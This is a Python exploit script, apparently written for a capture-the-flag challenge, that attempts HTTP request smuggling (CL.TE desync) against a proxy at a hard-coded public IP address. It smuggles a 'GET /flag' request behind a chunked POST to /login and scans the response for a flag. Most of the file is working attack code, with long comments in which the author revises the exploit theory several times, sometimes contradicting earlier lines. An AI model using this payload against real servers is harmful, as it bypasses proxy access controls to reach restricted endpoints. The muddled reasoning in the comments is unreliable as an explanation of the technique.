#!/usr/bin/env python3
"""
HTTP Request Smuggling exploit
The proxy doesn't handle Transfer-Encoding: chunked correctly
"""

import socket
import time

HOST = "210.79.190.102"
PORT = 8081

def cl_te_attack():
    """
    CL.TE: Frontend (proxy) uses Content-Length, backend uses Transfer-Encoding
    """
    print("[*] Attempting CL.TE attack...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    
    try:
        sock.connect((HOST, PORT))
        
        # The proxy reads Content-Length bytes
        # But upstream parses Transfer-Encoding: chunked
        # If Content-Length is smaller than chunked body, remaining bytes become next request
        
        # Chunked body: "5\r\nhello\r\n0\r\n\r\n" = 17 bytes
        # But if Content-Length is 5, proxy reads 5 bytes: "5\r\nh"
        # Upstream parses chunked: needs full "5\r\nhello\r\n0\r\n\r\n"
        # But proxy only forwarded 5 bytes, so upstream hangs or errors
        
        # Actually, let's try: Content-Length says one thing, but chunked body is different
        # Proxy reads Content-Length bytes and forwards them
        # Upstream parses as chunked and reads more
        
        # Let's try smuggling a request after the chunked body
        # Chunked format: size\r\ndata\r\n
        # To end: 0\r\n\r\n
        # After that, we can smuggle another request
        
        # The trick: Content-Length should match the chunked body we want to send
        # But we also include a smuggled request after
        
        # Actually, I think the issue is different
        # The proxy doesn't parse chunked, so if we send chunked without Content-Length,
        # the proxy won't read the body at all
        # But it forwards the headers including Transfer-Encoding
        # The upstream expects chunked body but gets nothing
        
        # Let's try: Send chunked body with Content-Length that's wrong
        # Proxy reads Content-Length bytes
        # Upstream parses chunked and reads full chunked body
        # The difference becomes the smuggled request
        
        # Chunked body: "0\r\n\r\nGET /flag HTTP/1.1\r\nHost: localhost\r\n\r\n"
        # This is: empty chunk (ends first request) + smuggled request
        # Content-Length: 4 (just "0\r\n")
        # Proxy reads 4 bytes, but upstream parses full chunked body
        
        # Wait, that won't work because the proxy forwards what it reads
        
        # Let me think differently: What if we send a request where Content-Length
        # is larger than the chunked body? Proxy reads Content-Length bytes,
        # but chunked body ends early, so remaining bytes become next request!
        
        # Chunked body: "0\r\n\r\n" (4 bytes, ends request)
        # Content-Length: 50
        # Proxy reads 50 bytes: "0\r\n\r\n" + 46 more bytes (which is our smuggled request!)
        # Upstream parses chunked: reads "0\r\n\r\n" (4 bytes, ends)
        # Remaining 46 bytes stay in buffer, become next request!
        
        smuggled = b"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 50\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /flag HTTP/1.1\r
Host: localhost\r
\r
"""
        
        print(f"[*] Sending CL.TE request ({len(smuggled)} bytes)...")
        sock.send(smuggled)
        
        time.sleep(2)
        
        response = b""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if len(response) > 50000:
                    break
        except:
            pass
        
        print(f"[+] Response ({len(response)} bytes):")
        if response:
            resp_str = response.decode('utf-8', errors='ignore')
            print(resp_str[:2000])
            
            if "BPJS{" in resp_str:
                flag_start = resp_str.find("BPJS{")
                flag_end = resp_str.find("}", flag_start) + 1
                flag = resp_str[flag_start:flag_end]
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

def te_cl_attack():
    """
    TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length
    But the proxy doesn't handle Transfer-Encoding, so this might not work
    """
    print("\n[*] Attempting TE.CL attack...")
    
    # The proxy doesn't parse Transfer-Encoding in requests
    # It only checks Content-Length
    # So if we send Transfer-Encoding: chunked without Content-Length,
    # the proxy won't read the body
    
    # But if we send both, the proxy will use Content-Length
    # And upstream might use Transfer-Encoding
    
    print("[*] Proxy doesn't handle Transfer-Encoding, so TE.CL might not work")
    
    return None

if __name__ == "__main__":
    print("=" * 70)
    print("HTTP Request Smuggling Exploit")
    print("=" * 70)
    
    result = cl_te_attack()
    if not result:
        te_cl_attack()
    
    if result:
        print(f"\n[+] SUCCESS! Flag: {result}")
    else:
        print("\n[-] Exploit didn't work. Need to refine approach.")



